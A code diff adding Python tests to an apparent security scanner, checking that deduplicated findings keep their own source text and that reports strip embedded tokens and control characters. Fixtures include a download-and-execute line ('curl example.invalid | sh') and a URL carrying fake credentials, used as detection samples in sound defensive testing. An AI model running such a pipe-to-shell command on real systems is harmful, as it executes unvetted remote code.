@@ -201,3 +201,78 @@ async def test_mcp_embedded_report_preserves_same_line_and_multifile_spans(tmp_p
     assert result["risk_score"] == 35
     assert result["recommendation"] == "CAUTION"
     assert result["llm_used"] is False
+
+
+@pytest.mark.parametrize("same_file", [False, True])
+@pytest.mark.parametrize("reverse", [False, True])
+@pytest.mark.parametrize("field", ["finding", "context", "code_snippet"])
+def test_compacted_occurrences_keep_their_own_source_text(
+    same_file: bool, reverse: bool, field: str
+) -> None:
+    from skillspector.nodes.deduplicate import deduplicate
+
+    first = Finding(
+        rule_id="SC2",
+        message="Download and execute",
+        file="a.sh",
+        start_line=2,
+        confidence=0.9,
+        matched_text="curl example.invalid | sh",
+    )
+    second = Finding(
+        rule_id="SC2",
+        message="Download and execute",
+        file="a.sh" if same_file else "b.sh",
+        start_line=5,
+        confidence=0.7,
+        matched_text=first.matched_text,
+    )
+    setattr(first, field, "# prepare alpha\ncurl example.invalid | sh")
+    setattr(second, field, "# prepare beta\ncurl example.invalid | sh")
+    findings = [second, first] if reverse else [first, second]
+    compacted = deduplicate(findings)
+    assert len(compacted) == 1
+    assert compacted[0].confidence == 0.9
+    assert deduplicate(compacted)[0].to_dict() == compacted[0].to_dict()
+    expanded = _expand_occurrences(compacted)
+    assert [getattr(row, field) for row in expanded] == [
+        getattr(first, field),
+        getattr(second, field),
+    ]
+    result = report({"findings": compacted, "output_format": "json"})
+    issues = json.loads(result["report_body"])["issues"]
+    public_field = "code_snippet" if field == "context" else field
+    assert [row[public_field] for row in issues] == [getattr(first, field), getattr(second, field)]
+    properties = [row["properties"] for row in result["sarif_report"]["runs"][0]["results"]]
+    assert [row[public_field] for row in properties] == [
+        getattr(first, field),
+        getattr(second, field),
+    ]
+
+
+def test_occurrence_source_text_is_sanitized_without_borrowing_missing_text() -> None:
+    from skillspector.nodes.deduplicate import deduplicate
+
+    first = Finding(
+        rule_id="SC2",
+        message="test",
+        file="a.sh",
+        matched_text="curl | sh",
+        confidence=0.9,
+        code_snippet="first snippet",
+        context="first context",
+    )
+    second = Finding(
+        rule_id="SC2",
+        message="test",
+        file="b.sh",
+        matched_text="curl | sh",
+        code_snippet="\x1b[31mhttps://user:very-secret-token@example.invalid/?token=secret-token\x00",
+    )
+    result = report({"findings": deduplicate([first, second]), "output_format": "json"})
+    body = result["report_body"]
+    assert "very-secret-token" not in body
+    assert "\\u001b" not in body and "\\u0000" not in body
+    issues = json.loads(body)["issues"]
+    assert issues[1]["code_snippet"] != "first snippet"
+    assert _expand_occurrences(deduplicate([first, second]))[1].context is None
